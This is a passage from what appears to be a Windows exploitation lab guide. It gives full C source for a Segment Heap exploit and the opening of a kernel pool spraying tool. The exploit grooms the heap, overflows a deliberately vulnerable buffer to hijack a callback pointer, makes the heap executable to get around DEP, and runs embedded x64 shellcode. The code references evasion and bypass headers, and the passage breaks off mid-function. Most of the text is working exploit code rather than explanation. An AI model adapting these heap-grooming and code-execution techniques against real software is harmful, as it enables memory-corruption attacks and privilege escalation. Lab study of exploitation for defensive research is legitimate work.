cl src\heap_feng_shui.c /Fe:bin\heap_feng_shui.exe /O2 /I.\headers
.\bin\heap_feng_shui.exe
```

### Segment Heap Exploitation

Windows Segment Heap (default for UWP apps, Edge, modern processes) uses Variable Size (VS) allocations for small objects and Large Block (LB) for larger ones. VS allocations are served from subsegments with separate metadata storage. The exploitation technique uses adaptive spray counts (500-2000 VS, 10-50 LB based on available memory) with 0x100 byte VS size. Four-phase VS exploitation: (1) spray with timing analysis, (2) bucket alignment (free ALL), (3) every-other pattern creating holes, (4) refill with controlled objects containing fake headers (0xDEADBEEF magic, refcount, fake vtable). Physical adjacency analysis (20-allocation window, max distance allocation_size + 0x40) identifies exploitation targets. Type confusion attack: finds adjacent source/target pair, allocates CONTROLLED_VS_OBJECT (0x100 bytes padding) and VULNERABLE_VS_OBJECT (magic, refcount, vtable, callback pointer, 0xE0 data), crafts overflow payload with padding + fake object, triggers VulnerableFunction overflow, corrupts callback pointer to ExploitCallback. ExploitCallback: disables DEP via VirtualProtect on heap region, executes test shellcode (returns 0x1337) confirming arbitrary code execution. LB exploitation: detects page-aligned allocations, identifies guard pages via VirtualQuery, bypasses guards with VirtualProtect, demonstrates overflow across guard boundaries. Shellcode preparation: allocates RWX buffer, copies test shellcode (mov rax, 0x1337; ret) and demo shellcode (MessageBox), patches MessageBoxA address, marks executable.

```c
// segment_heap_exploit.c
// Segment Heap exploitation
// Compile: cl src\segment_heap_exploit.c /Fe:bin\segment_heap_exploit.exe /O2 /I.\headers

#define SYSCALLS_IMPLEMENTATION
#define EVASION_IMPLEMENTATION
#define BYPASS_IMPLEMENTATION

#include "exploit_common.h"
#include "exploit_utils.h"
#include "evasion.h"
#include "bypass.h"
#include "heap_utils.h"
#include <stdio.h>
#include <intrin.h>
#include <winternl.h>
#include <psapi.h>

#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ntdll.lib")

static BYTE g_shellcode[256] = {0};
static PVOID g_shellcodeAddr = NULL;

// Test shellcode that returns 0x1337
static BYTE test_shellcode[] = {
    0x48, 0xC7, 0xC0, 0x37, 0x13, 0x00, 0x00,       // mov rax, 0x1337
    0xC3                                             // ret
};

// MessageBox shellcode (x64)
static BYTE demo_shellcode[] = {
    0x48, 0x83, 0xEC, 0x38,                         // sub rsp, 0x38
    0x48, 0x31, 0xC9,                               // xor rcx, rcx
    0x48, 0x8D, 0x15, 0x2B, 0x00, 0x00, 0x00,       // lea rdx, [rip+0x2B]
    0x4C, 0x8D, 0x05, 0x34, 0x00, 0x00, 0x00,       // lea r8, [rip+0x34]
    0x45, 0x31, 0xC9,                               // xor r9d, r9d
    0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, MessageBoxA
    0x48, 0x89, 0x44, 0x24, 0x20,                   // mov [rsp+0x20], rax
    0xFF, 0x54, 0x24, 0x20,                         // call qword ptr [rsp+0x20]
    0x48, 0x83, 0xC4, 0x38,                         // add rsp, 0x38
    0xC3,                                           // ret
    0x90, 0x90, 0x90, 0x90, 0x90,                   // padding
    'S','e','g','m','e','n','t',' ','H','e','a','p',' ','P','w','n','!',0,
    0x00, 0x00, 0x00,
    'E','x','p','l','o','i','t','!',0
};

typedef struct _SEGMENT_HEAP_CONFIG {
    DWORD vsAllocationSize;
    DWORD lbAllocationSize;
    DWORD vsSprayCount;
    DWORD lbSprayCount;
    DWORD holePattern;
    BOOL enableGuardBypass;
    BOOL enableMetadataCorruption;
    BOOL enableTypeConfusion;
} SEGMENT_HEAP_CONFIG, *PSEGMENT_HEAP_CONFIG;

typedef struct _SEGMENT_HEAP_RESULT {
    BOOL segmentHeapActive;
    BOOL lfhEnabled;
    DWORD vsSubsegmentCount;
    DWORD lbBlockCount;
    DWORD guardPagesDetected;
    DWORD adjacentPairs;
    DWORD metadataCorruptionSuccess;
    DWORD guardBypassSuccess;
    DWORD exploitationSuccess;
    float physicalAdjacencyRate;
} SEGMENT_HEAP_RESULT, *PSEGMENT_HEAP_RESULT;

typedef struct _VS_ALLOCATION_OBJECT {
    PVOID address;
    DWORD size;
    DWORD sequence;
    UINT64 allocTime;
    BOOL isHole;
    DWORD adjacencyScore;
    BYTE markerPattern;
} VS_ALLOCATION_OBJECT, *PVS_ALLOCATION_OBJECT;

typedef struct _LB_ALLOCATION_OBJECT {
    PVOID address;
    DWORD size;
    DWORD guardPageStatus;
    DWORD memoryProtection;
    BOOL isCorrupted;
    UINT64 allocTime;
} LB_ALLOCATION_OBJECT, *PLB_ALLOCATION_OBJECT;

typedef struct _VULNERABLE_VS_OBJECT {
    DWORD magic;
    DWORD refCount;
    PVOID vtable;
    void (*callback)(void*);
    BYTE data[0xE0];
} VULNERABLE_VS_OBJECT, *PVULNERABLE_VS_OBJECT;

typedef struct _CONTROLLED_VS_OBJECT {
    BYTE padding[0x100];
} CONTROLLED_VS_OBJECT, *PCONTROLLED_VS_OBJECT;

static void SafeCallback(void* param) {
    printf("        [*] Safe callback executed with param: %p\n", param);
}

static void ExploitCallback(void* param) {
    printf("        [*] EXPLOIT CALLBACK TRIGGERED!\n");
    printf("        [*] Param: %p\n", param);
    printf("        [*] Stage 1: Disabling DEP via VirtualProtect...\n");
    PVULNERABLE_VS_OBJECT vuln = (PVULNERABLE_VS_OBJECT)param;
    MEMORY_BASIC_INFORMATION mbi;
    if (VirtualQuery(vuln, &mbi, sizeof(mbi))) {
        printf("            Current protection: 0x%08X\n", mbi.Protect);
        printf("            Region base: %p\n", mbi.BaseAddress);
        printf("            Region size: 0x%llX\n", mbi.RegionSize);
        DWORD oldProtect;
        if (VirtualProtect(mbi.BaseAddress, mbi.RegionSize,
                          PAGE_EXECUTE_READWRITE, &oldProtect)) {
            printf("            [+] DEP disabled for heap region!\n");
            printf("            [+] Old: 0x%08X -> New: PAGE_EXECUTE_READWRITE\n", oldProtect);
        }
    }
    if (g_shellcodeAddr) {
        printf("\n        [*] Stage 2: Executing shellcode...\n");
        printf("            Shellcode address: %p\n", g_shellcodeAddr);
        MEMORY_BASIC_INFORMATION shellcodeMbi;
        if (VirtualQuery(g_shellcodeAddr, &shellcodeMbi, sizeof(shellcodeMbi))) {
            printf("            Shellcode protection: 0x%08X\n", shellcodeMbi.Protect);
            if (!(shellcodeMbi.Protect & (PAGE_EXECUTE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE))) {
                printf("            [-] Shellcode not executable, fixing...\n");
                DWORD oldProt;
                VirtualProtect(g_shellcodeAddr, 4096, PAGE_EXECUTE_READ, &oldProt);
            }
        }
        printf("\n            [*] Test 1: Executing test shellcode...\n");
        typedef int (*ShellcodeFunc)(void);
        ShellcodeFunc testShellcode = (ShellcodeFunc)g_shellcodeAddr;
        __try {
            int result = testShellcode();
            if (result == 0x1337) {
                printf("            [+] TEST PASSED! Shellcode returned 0x%X\n", result);
                printf("            [+] ARBITRARY CODE EXECUTION CONFIRMED!\n");
            } else {
                printf("            [?] Unexpected return value: 0x%X\n", result);
            }
        }
        __except(EXCEPTION_EXECUTE_HANDLER) {
            printf("            [-] Test shellcode failed (exception: 0x%08X)\n", GetExceptionCode());
        }
    }
}

static BOOL PrepareShellcode(void) {
    printf("    [*] Preparing shellcode...\n");
    g_shellcodeAddr = VirtualAlloc(NULL, 4096,
                                   MEM_COMMIT | MEM_RESERVE,
                                   PAGE_READWRITE);
    if (!g_shellcodeAddr) {
        printf("    [-] Failed to allocate shellcode memory\n");
        return FALSE;
    }
    printf("    [+] Allocated shellcode buffer at: %p\n", g_shellcodeAddr);
    memcpy(g_shellcodeAddr, test_shellcode, sizeof(test_shellcode));
    memcpy((BYTE*)g_shellcodeAddr + 0x100, demo_shellcode, sizeof(demo_shellcode));
    HMODULE hUser32 = LoadLibraryA("user32.dll");
    if (hUser32) {
        PVOID pMessageBoxA = GetProcAddress(hUser32, "MessageBoxA");
        if (pMessageBoxA) {
            *(UINT64*)((BYTE*)g_shellcodeAddr + 0x100 + 0x14) = (UINT64)pMessageBoxA;
            printf("    [+] Patched MessageBoxA address: %p\n", pMessageBoxA);
        } else {
            printf("    [-] Failed to resolve MessageBoxA\n");
            return FALSE;
        }
    } else {
        printf("    [-] Failed to load user32.dll\n");
        return FALSE;
    }
    DWORD oldProtect;
    if (!VirtualProtect(g_shellcodeAddr, 4096,
                       PAGE_EXECUTE_READ, &oldProtect)) {
        printf("    [-] VirtualProtect failed: 0x%08X\n", GetLastError());
        return FALSE;
    }
    printf("    [+] Shellcode marked as executable (DEP bypassed)\n");
    printf("    [+] Old protection: 0x%08X, New: PAGE_EXECUTE_READ\n", oldProtect);
    return TRUE;
}

static void VulnerableFunction(PCONTROLLED_VS_OBJECT controlled, const char* input, size_t inputLen) {
    memcpy(controlled->padding, input, inputLen);  // VULNERABLE!
}

static void TriggerCallback(PVULNERABLE_VS_OBJECT obj) {
    if (obj->callback) {
        printf("        [*] Triggering callback at: %p\n", obj->callback);
        obj->callback(obj);
    }
}

static void AnalyzeSegmentHeapState(PSEGMENT_HEAP_RESULT result) {
    printf("[*] Analyzing heap state...\n");
    result->segmentHeapActive = AnalyzeSegmentHeap(NULL);
    result->lfhEnabled = AnalyzeLFHActivation(GetProcessHeap(), 0x100);

    HANDLE hHeap = GetProcessHeap();
    ULONG heapInfo = 0;
    HeapQueryInformation(hHeap, HeapCompatibilityInformation, &heapInfo, sizeof(heapInfo), NULL);
    printf("    Heap compatibility: %lu (%s)\n", heapInfo,
           heapInfo >= 3 ? "Segment Heap" : heapInfo == 2 ? "LFH" : "Legacy");
    printf("    LFH activated: %s\n", result->lfhEnabled ? "YES" : "NO");

    if (heapInfo < 2) {
        ULONG enable = 2;
        HeapSetInformation(hHeap, HeapCompatibilityInformation, &enable, sizeof(enable));
        result->lfhEnabled = AnalyzeLFHActivation(hHeap, 0x100);
        printf("    LFH after enable: %s\n", result->lfhEnabled ? "YES" : "NO");
    }
}

static BOOL ExploitVSAllocations(PSEGMENT_HEAP_CONFIG config,
                               PSEGMENT_HEAP_RESULT result) {
    printf("\n[*] Exploiting Variable Size (VS) allocations...\n");
    HANDLE hHeap = GetProcessHeap();
    PVS_ALLOCATION_OBJECT vsArray = (PVS_ALLOCATION_OBJECT)malloc(
        config->vsSprayCount * sizeof(VS_ALLOCATION_OBJECT));
    if (!vsArray) return FALSE;
    memset(vsArray, 0, config->vsSprayCount * sizeof(VS_ALLOCATION_OBJECT));
    DWORD allocated = 0;
    DWORD64 totalTime = 0;
    printf("    Phase 1: Spraying %d VS allocations (0x%X bytes)...\n",
           config->vsSprayCount, config->vsAllocationSize);
    for (DWORD i = 0; i < config->vsSprayCount; i++) {
        _mm_lfence();
        DWORD64 start = __rdtsc();
        vsArray[i].address = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, config->vsAllocationSize);
        _mm_lfence();
        DWORD64 end = __rdtsc();
        if (!vsArray[i].address) break;
        vsArray[i].allocTime = end - start;
        vsArray[i].size = config->vsAllocationSize;
        vsArray[i].sequence = i;
        vsArray[i].isHole = FALSE;
        vsArray[i].adjacencyScore = 0;
        vsArray[i].markerPattern = 0x41 + (i % 26);
        totalTime += vsArray[i].allocTime;
        allocated++;
        memset(vsArray[i].address, vsArray[i].markerPattern, config->vsAllocationSize);
    }
    printf("    Sprayed %d VS allocations\n", allocated);
    printf("    Average timing: %llu cycles\n", allocated > 0 ? totalTime / allocated : 0);
    printf("    Phase 2: Bucket alignment - freeing all to reset LFH state...\n");
    for (DWORD i = 0; i < allocated; i++) {
        if (vsArray[i].address) {
            HeapFree(hHeap, 0, vsArray[i].address);
            vsArray[i].address = NULL;
            vsArray[i].isHole = TRUE;
        }
    }
    printf("    Phase 3: Creating controlled layout with hole pattern...\n");
    DWORD allocCount = 0;
    DWORD holeCount = 0;
    for (DWORD i = 0; i < allocated; i++) {
        if (i % 2 == 0) {
            vsArray[i].address = HeapAlloc(hHeap, 0, config->vsAllocationSize);
            if (vsArray[i].address) {
                memset(vsArray[i].address, 0x41, config->vsAllocationSize);
                vsArray[i].isHole = FALSE;
                allocCount++;
            }
        } else {
            vsArray[i].address = NULL;
            vsArray[i].isHole = TRUE;
            holeCount++;
        }
    }
    printf("    Created layout: %d allocations, %d holes\n", allocCount, holeCount);
    printf("    Phase 4: Refilling holes with controlled objects...\n");
    DWORD refilled = 0;
    for (DWORD i = 0; i < allocated; i++) {
        if (vsArray[i].isHole && !vsArray[i].address) {
            vsArray[i].address = HeapAlloc(hHeap, 0, config->vsAllocationSize);
            if (vsArray[i].address) {
                memset(vsArray[i].address, 0x42, config->vsAllocationSize);
                // Add controlled headers for type confusion
                if (config->vsAllocationSize >= sizeof(DWORD) * 4) {
                    PDWORD header = (PDWORD)vsArray[i].address;
                    header[0] = 0xDEADBEEF;  // Magic
                    header[1] = 1;            // RefCount
                    header[2] = 0x43434343;   // Fake vtable (low)
                    header[3] = 0x43434343;   // Fake vtable (high)
                }

                vsArray[i].isHole = FALSE;
                refilled++;
            }
        }
    }
    printf("    Refilled %d holes\n", refilled);
    printf("    Phase 5: Verifying adjacency...\n");
    DWORD sequentialAdjacent = 0;
    DWORD physicallyAdjacent = 0;
    DWORD totalPairs = 0;
    for (DWORD i = 1; i < allocated; i++) {
        if (!vsArray[i].address || !vsArray[i-1].address) continue;
        totalPairs++;
        LONG_PTR diff = (LONG_PTR)vsArray[i].address - (LONG_PTR)vsArray[i-1].address;
        if (diff > 0 && diff <= (LONG_PTR)(config->vsAllocationSize + 0x40)) {
            sequentialAdjacent++;
            DWORD qualityScore = 100;
            if (diff > config->vsAllocationSize) {
                qualityScore -= ((diff - config->vsAllocationSize) * 100) /
                              (config->vsAllocationSize + 0x40);
            }
            vsArray[i].adjacencyScore = qualityScore;
            vsArray[i-1].adjacencyScore = qualityScore;
        }
    }
    for (DWORD i = 0; i < allocated; i++) {
        if (!vsArray[i].address) continue;
        for (DWORD j = i + 1; j < allocated && j < i + 20; j++) {
            if (!vsArray[j].address) continue;
            LONG_PTR diff = (LONG_PTR)vsArray[j].address - (LONG_PTR)vsArray[i].address;
            if (diff > 0 && diff <= (config->vsAllocationSize + 0x40)) {
                physicallyAdjacent++;
                DWORD qualityScore = 100;
                if (diff > config->vsAllocationSize) {
                    qualityScore -= ((diff - config->vsAllocationSize) * 100) /
                                  (config->vsAllocationSize + 0x40);
                }
                if (qualityScore > vsArray[i].adjacencyScore) {
                    vsArray[i].adjacencyScore = qualityScore;
                }
                break;
            }
        }
    }

    result->adjacentPairs = physicallyAdjacent;
    result->physicalAdjacencyRate = (physicallyAdjacent * 100.0) / allocated;
    printf("    Sequential adjacency: %d/%d\n", sequentialAdjacent, totalPairs);
    printf("    Physical adjacency: %d (%.1f%%)\n", physicallyAdjacent, result->physicalAdjacencyRate);
    if (config->enableTypeConfusion && result->physicalAdjacencyRate > 25.0) {
        printf("\n    Phase 6: Type confusion exploitation...\n");
        DWORD sourceIdx = 0, targetIdx = 0;
        LONG_PTR bestDistance = LONG_MAX;
        BOOL foundPair = FALSE;
        for (DWORD i = 0; i < allocated; i++) {
            if (!vsArray[i].address) continue;
            for (DWORD j = i + 1; j < allocated && j < i + 20; j++) {
                if (!vsArray[j].address) continue;
                LONG_PTR diff = (LONG_PTR)vsArray[j].address - (LONG_PTR)vsArray[i].address;
                if (diff > 0 && diff <= (config->vsAllocationSize + 0x40) && diff < bestDistance) {
                    sourceIdx = i;
                    targetIdx = j;
                    bestDistance = diff;
                    foundPair = TRUE;
                }
            }
        }

        if (foundPair) {
            printf("    [+] Found exploitation target:\n");
            printf("        Source [%d]: %p\n", sourceIdx, vsArray[sourceIdx].address);
            printf("        Target [%d]: %p\n", targetIdx, vsArray[targetIdx].address);
            printf("        Distance: 0x%llX bytes\n", bestDistance);
            PCONTROLLED_VS_OBJECT controlled = (PCONTROLLED_VS_OBJECT)vsArray[sourceIdx].address;
            memset(controlled, 0x42, sizeof(CONTROLLED_VS_OBJECT));
            PVULNERABLE_VS_OBJECT vulnerable = (PVULNERABLE_VS_OBJECT)vsArray[targetIdx].address;
            vulnerable->magic = 0xDEADBEEF;
            vulnerable->refCount = 1;
            vulnerable->vtable = NULL;
            vulnerable->callback = SafeCallback;
            memset(vulnerable->data, 0xCC, sizeof(vulnerable->data));
            printf("        [+] Controlled object at: %p\n", controlled);
            printf("        [+] Vulnerable object at: %p\n", vulnerable);
            printf("        [*] Original callback: %p (SafeCallback)\n", vulnerable->callback);
            printf("\n        [*] Testing safe callback...\n");
            TriggerCallback(vulnerable);
            printf("\n        [*] Crafting exploit payload...\n");
            size_t payloadSize = bestDistance + sizeof(VULNERABLE_VS_OBJECT);
            BYTE* payload = (BYTE*)malloc(payloadSize);
            if (!payload) {
                printf("        [-] Payload allocation failed\n");
            } else {
                printf("        [*] Payload size: 0x%llX bytes\n", payloadSize);
                // Fill initial padding
                memset(payload, 0x41, 0x100);
                // Calculate overflow offset
                DWORD overflowOffset = (DWORD)bestDistance;
                // Fill gap if needed
                if (bestDistance > 0x100) {
                    memset(payload + 0x100, 0x41, bestDistance - 0x100);
                }
                // Corrupt the vulnerable object
                PVULNERABLE_VS_OBJECT fakeVuln = (PVULNERABLE_VS_OBJECT)(payload + overflowOffset);
                fakeVuln->magic = 0x43434343;
                fakeVuln->refCount = 0xFFFFFFFF;
                fakeVuln->vtable = (PVOID)0x4444444444444444ULL;
                fakeVuln->callback = ExploitCallback;
                printf("        [+] Payload crafted:\n");
                printf("            Padding: 0x%X bytes\n", overflowOffset);
                printf("            Corrupted magic: 0x%08X\n", fakeVuln->magic);
                printf("            Corrupted callback: %p (ExploitCallback)\n", fakeVuln->callback);
                printf("\n        [*] Triggering heap overflow vulnerability...\n");
                printf("        [!] Calling VulnerableFunction with oversized input...\n");
                VulnerableFunction(controlled, (const char*)payload, overflowOffset + sizeof(VULNERABLE_VS_OBJECT));
                printf("        [+] Overflow completed\n");
                printf("        [*] Vulnerable object corrupted:\n");
                printf("            Magic: 0x%08X (was 0xDEADBEEF)\n", vulnerable->magic);
                printf("            Callback: %p (was %p)\n", vulnerable->callback, SafeCallback);
                printf("\n        [*] Triggering corrupted callback for CODE EXECUTION...\n");
                printf("        [*] ========================================\n");
                TriggerCallback(vulnerable);
                printf("        [*] ========================================\n");
                printf("\n        [+] EXPLOITATION SUCCESSFUL!\n");
                result->metadataCorruptionSuccess++;
                result->exploitationSuccess = 1;
                free(payload);
            }
        } else {
            printf("    [-] No suitable adjacent pair found for exploitation\n");
        }
    }

    for (DWORD i = 0; i < allocated; i++) {
        if (vsArray[i].address) {
            HeapFree(hHeap, 0, vsArray[i].address);
        }
    }
    free(vsArray);

    return (physicallyAdjacent > 0);
}

static BOOL ExploitLBAllocations(PSEGMENT_HEAP_CONFIG config,
                               PSEGMENT_HEAP_RESULT result) {
    printf("\n[*] Exploiting Large Block (LB) allocations...\n");
    HANDLE hHeap = GetProcessHeap();
    PLB_ALLOCATION_OBJECT lbArray = (PLB_ALLOCATION_OBJECT)malloc(
        config->lbSprayCount * sizeof(LB_ALLOCATION_OBJECT));
    if (!lbArray) return FALSE;
    memset(lbArray, 0, config->lbSprayCount * sizeof(LB_ALLOCATION_OBJECT));
    DWORD allocated = 0;
    printf("    Phase 1: Allocating %d large blocks (0x%X bytes)...\n",
           config->lbSprayCount, config->lbAllocationSize);
    for (DWORD i = 0; i < config->lbSprayCount; i++) {
        lbArray[i].address = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, config->lbAllocationSize);
        if (!lbArray[i].address) break;
        lbArray[i].size = config->lbAllocationSize;
        lbArray[i].isCorrupted = FALSE;
        allocated++;
        if (((ULONG_PTR)lbArray[i].address & 0xFFF) == 0) {
            printf("    LB block %d: %p (page-aligned)\n", i, lbArray[i].address);
        }
        MEMORY_BASIC_INFORMATION mbi;
        if (VirtualQuery(lbArray[i].address, &mbi, sizeof(mbi))) {
            lbArray[i].memoryProtection = mbi.Protect;
            PVOID guardCheck = (BYTE*)lbArray[i].address + config->lbAllocationSize;
            MEMORY_BASIC_INFORMATION guardMbi;
            if (VirtualQuery(guardCheck, &guardMbi, sizeof(guardMbi))) {
                if (guardMbi.Protect & PAGE_GUARD) {
                    result->guardPagesDetected++;
                    lbArray[i].guardPageStatus = 1;
                    printf("    Guard page detected after block %d\n", i);
                }
            }
        }
        memset(lbArray[i].address, 0x43 + (i % 10), config->lbAllocationSize);
    }
    printf("    Allocated %d large blocks\n", allocated);
    printf("    Guard pages detected: %d\n", result->guardPagesDetected);
    if (config->enableGuardBypass && result->guardPagesDetected > 0) {
        printf("\n    Phase 2: Attempting guard page bypass...\n");
        DWORD bypassSuccess = 0;
        for (DWORD i = 0; i < allocated; i++) {
            if (lbArray[i].guardPageStatus) {
                printf("    Testing bypass on block %d...\n", i);
                // Technique 1: Write up to but not past page boundary
                BYTE* endPtr = (BYTE*)lbArray[i].address + config->lbAllocationSize - 1;
                *endPtr = 0x44;  // Safe write
                // Technique 2: VirtualProtect to remove guard
                PVOID guardAddr = (BYTE*)lbArray[i].address + config->lbAllocationSize;
                DWORD oldProtect;
                if (VirtualProtect(guardAddr, 0x1000, PAGE_READWRITE, &oldProtect)) {
                    printf("      [+] VirtualProtect bypass successful\n");
                    memset(guardAddr, 0x45, 0x100);
                    if (*(BYTE*)guardAddr == 0x45) {
                        bypassSuccess++;
                        lbArray[i].isCorrupted = TRUE;
                        printf("      [+] Guard page bypassed, overflow possible\n");
                    }
                    VirtualProtect(guardAddr, 0x1000, oldProtect, &oldProtect);
                }
            }
        }

        result->guardBypassSuccess = bypassSuccess;
        printf("    Guard bypass success: %d/%d\n", bypassSuccess, result->guardPagesDetected);
    }

    if (config->enableMetadataCorruption && allocated > 1) {
        printf("\n    Phase 3: LB overflow exploitation...\n");
        for (DWORD i = 1; i < allocated; i++) {
            if (lbArray[i].address && lbArray[i-1].address) {
                LONG_PTR diff = (LONG_PTR)lbArray[i].address -
                               (LONG_PTR)lbArray[i-1].address;
                if (diff > 0 && diff <= (LONG_PTR)(config->lbAllocationSize + 0x10000)) {
                    PVOID source = lbArray[i-1].address;
                    PVOID target = lbArray[i].address;
                    printf("      Source block %d: %p\n", i-1, source);
                    printf("      Target block %d: %p\n", i, target);
                    printf("      Distance: 0x%llX bytes\n", diff);

                    BYTE savedTarget[16];
                    memcpy(savedTarget, target, sizeof(savedTarget));
                    printf("      Target before: ");
                    for (int j = 0; j < 16; j++) printf("%02X ", savedTarget[j]);
                    printf("\n");

                    DWORD overflowBytes = 16;
                    __try {
                        memset((BYTE*)source + config->lbAllocationSize - 16, 0xEE, 16);
                        memset((BYTE*)source + diff, 0xDD, overflowBytes);
                    } __except(EXCEPTION_EXECUTE_HANDLER) {
                        printf("      [-] Overflow caused exception (guard page active)\n");
                        break;
                    }

                    BOOL corrupted = (((BYTE*)target)[0] == 0xDD);
                    printf("      Target after:  ");
                    for (int j = 0; j < 16; j++) printf("%02X ", ((BYTE*)target)[j]);
                    printf("\n");

                    if (corrupted) {
                        printf("      [+] LB overflow VERIFIED - target corrupted\n");
                        result->metadataCorruptionSuccess++;
                    } else {
                        printf("      [-] Target not corrupted (gap between blocks)\n");
                    }
                    memcpy(target, savedTarget, sizeof(savedTarget));
                    break;
                }
            }
        }
    }
    result->lbBlockCount = allocated;
    for (DWORD i = 0; i < allocated; i++) {
        if (lbArray[i].address) {
            HeapFree(hHeap, 0, lbArray[i].address);
        }
    }
    free(lbArray);
    return (allocated > 0);
}

static BOOL ConfigureSegmentHeap(PSEGMENT_HEAP_CONFIG config) {
    DWORD cpuCount = GetCPUCount();
    DWORD availMB = GetSystemMemoryMB();
    config->vsAllocationSize = 0x100;
    config->lbAllocationSize = 0x40000;
    config->holePattern = 2;
    config->enableGuardBypass = TRUE;
    config->enableMetadataCorruption = TRUE;
    config->enableTypeConfusion = TRUE;
    if (availMB > 8192) {
        config->vsSprayCount = 2000;
        config->lbSprayCount = 50;
    } else if (availMB > 4096) {
        config->vsSprayCount = 1500;
        config->lbSprayCount = 30;
    } else if (availMB > 2048) {
        config->vsSprayCount = 1000;
        config->lbSprayCount = 20;
    } else {
        config->vsSprayCount = 500;
        config->lbSprayCount = 10;
    }
    printf("[*] System configuration:\n");
    printf("    CPU cores: %d\n", cpuCount);
    printf("    Available memory: %u MB\n", availMB);
    printf("    VS spray count: %d\n", config->vsSprayCount);
    printf("    LB spray count: %d\n", config->lbSprayCount);
    printf("    Strategy: Bucket filling with every-other pattern\n");

    return TRUE;
}

int main() {

    if (!ExploitInitialize(FALSE)) return 1;
    printf("=== Segment Heap Exploitation ===\n");
    SEGMENT_HEAP_CONFIG config = {0};
    if (!ConfigureSegmentHeap(&config)) {
        printf("[-] Failed to configure Segment Heap analysis\n");
        return 1;
    }
    SetExploitPriority(1);
    if (!PrepareShellcode()) {
        printf("[-] Shellcode preparation failed\n");
        return 1;
    }
    SEGMENT_HEAP_RESULT result = {0};
    printf("\n[*] Starting Segment Heap exploitation...\n");

    AnalyzeSegmentHeapState(&result);

    BOOL vsSuccess = FALSE;
    if (config.vsSprayCount > 0) {
        vsSuccess = ExploitVSAllocations(&config, &result);
        result.vsSubsegmentCount = config.vsSprayCount;
    }

    BOOL lbSuccess = FALSE;
    if (config.lbSprayCount > 0) {
        lbSuccess = ExploitLBAllocations(&config, &result);
    }
    if (g_shellcodeAddr) {
        VirtualFree(g_shellcodeAddr, 0, MEM_RELEASE);
        g_shellcodeAddr = NULL;
    }
    return result.exploitationSuccess ? 0 : 1;
}
```

**Compile & Run:**

```bash
cd c:\Windows_Mitigations_Lab
cl src\segment_heap_exploit.c /Fe:bin\segment_heap_exploit.exe /O2 /I.\headers
.\bin\segment_heap_exploit.exe
```

### Kernel Pool Spraying

Kernel pool spraying places controlled kernel objects in predictable pool locations to facilitate reliable overflow exploitation. The implementation uses adaptive spray counts based on available memory (2000-5000 reserve objects, 1500-3000 IOCP, 1500-3000 events, 1000-2000 semaphores, 1000-2000 pipes). Multi-primitive approach: NtAllocateReserveObject (0x60 bytes, 'IoCo' tag), IOCP (0x48 bytes), Events (0x40 bytes), Semaphores (0x48 bytes), and pipe buffers (0x100-0x300 bytes with controlled content). Three-phase strategy: (1) spray each object type with RDTSC timing measurement (5x average threshold detects subsegment boundaries), (2) create holes using every-Nth pattern (default N=10, ~10% hole coverage), (3) widen holes by freeing single allocations between existing holes (adds ~10% more holes). Pool state analysis: timing variance ratio (max-min)/avg indicates consistency, subsegment boundary density per 1000 allocs, hole coverage percentage, estimated kernel pool footprint in KB. Assessment criteria: variance ratio <100 + hole coverage 8-20% = viable spray, high variance (≥100x) = fragmented pool, suboptimal hole coverage requires adjustment. Note: actual adjacency cannot be verified from userland - requires kernel debugger (!pool, !poolfind) or information leak.

```c
// kernel_pool_spray.c
// Compile: cl src\kernel_pool_spray.c /Fe:bin\pool_spray.exe /O2 /I.\headers

#define SYSCALLS_IMPLEMENTATION
#define EVASION_IMPLEMENTATION
#define BYPASS_IMPLEMENTATION

#include "exploit_common.h"
#include "exploit_utils.h"
#include "evasion.h"
#include "bypass.h"
#include "heap_utils.h"
#include <stdio.h>
#include <intrin.h>
#include <winternl.h>
#include <psapi.h>

#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")

typedef NTSTATUS (NTAPI *pNtAllocateReserveObject_t)(PHANDLE, PVOID, DWORD);
typedef NTSTATUS (NTAPI *pNtClose_t)(HANDLE);

static pNtAllocateReserveObject_t g_pfnNtAllocateReserveObject = NULL;
static pNtClose_t g_pfnNtClose = NULL;

#define POOL_OBJ_RESERVE    1
#define POOL_OBJ_IOCP       2
#define POOL_OBJ_PIPE       3
#define POOL_OBJ_EVENT      4
#define POOL_OBJ_SEMAPHORE  5
#define POOL_OBJ_MUTANT     6

typedef struct _POOL_OBJECT {
    HANDLE handle;
    DWORD objectType;
    DWORD objectSize;
    UINT64 allocTime;
    BOOL isHole;
} POOL_OBJECT, *PPOOL_OBJECT;

typedef struct _SPRAY_STATS {
    DWORD count;
    DWORD succeeded;
    UINT64 avgTime;
    UINT64 minTime;
    UINT64 maxTime;
    DWORD boundaryHits;
} SPRAY_STATS;

static DWORD SprayObjects(PPOOL_OBJECT array, DWORD count, DWORD objType,
                          const char* name, DWORD expectedSize, SPRAY_STATS* stats) {
    printf("[*] Spraying %d %s (0x%X bytes)...\n", count, name, expectedSize);

    DWORD sprayed = 0;
    UINT64 totalTime = 0;
    UINT64 minTime = ~0ULL, maxTime = 0;
    DWORD boundaries = 0;

    for (DWORD i = 0; i < count; i++) {
        _mm_lfence();
        UINT64 start = __rdtsc();

        HANDLE h = NULL;
        switch (objType) {
            case POOL_OBJ_RESERVE: {
                NTSTATUS st = g_pfnNtAllocateReserveObject(&h, NULL, 1);
                if (!NT_SUCCESS(st)) h = NULL;
                break;
            }
            case POOL_OBJ_IOCP:
                h = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, 1);
                if (h == INVALID_HANDLE_VALUE) h = NULL;
                break;
            case POOL_OBJ_EVENT:
                h = CreateEventA(NULL, TRUE, FALSE, NULL);
                break;
            case POOL_OBJ_SEMAPHORE:
                h = CreateSemaphoreA(NULL, 0, 1, NULL);
                break;
            case POOL_OBJ_MUTANT:
                h = CreateMutexA(NULL, FALSE, NULL);
                break;
        }

        _mm_lfence();
        UINT64 elapsed = __rdtsc() - start;

        if (!h) {
            if (sprayed < 50) {
                printf("    [-] Failed at %d, aborting\n", i);
                break;
            }
            continue;
        }

        array[i].handle = h;
        array[i].objectType = objType;
        array[i].objectSize = expectedSize;
        array[i].allocTime = elapsed;
        array[i].isHole = FALSE;

        totalTime += elapsed;
        if (elapsed < minTime) minTime = elapsed;
        if (elapsed > maxTime) maxTime = elapsed;
